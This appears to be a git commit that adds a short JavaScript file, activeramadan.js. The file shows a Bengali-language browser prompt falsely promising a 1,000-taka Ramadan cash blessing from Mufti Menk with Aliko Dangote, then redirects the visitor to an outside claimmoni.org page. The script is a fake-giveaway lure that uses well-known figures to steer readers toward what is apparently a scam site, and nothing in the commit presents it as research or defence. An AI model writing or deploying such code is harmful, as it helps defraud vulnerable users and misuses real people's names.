7d0cc6fcd8feab5b2881efa3757b1938409ae082
clmmoni <kkween1.00@gmail.com>
2026-02-18 03:47:50 +0100

    Create activeramadan.js

---
+++ activeramadan.js
@@ -0,0 +1,10 @@
+var password = '৳1,000';
+
+password = prompt(
+  'অভিনন্দন, আপনি আলিকো ডাঙ্গোটের সহযোগিতায় মুফতি মেনকের কাছ থেকে ৳১,০০০ রমজান নগদ আশীর্বাদ পাওয়ার যোগ্য। এখনই সক্রিয় করতে ঠিক আছে ক্লিক করুন।.',
+  '৳1,000'
+);
+
+if (password !== '৳1,000') {
+    location.href = 'https://claimmoni.org/Tk1000-Ramadan-Shahabuddin.html';
+}
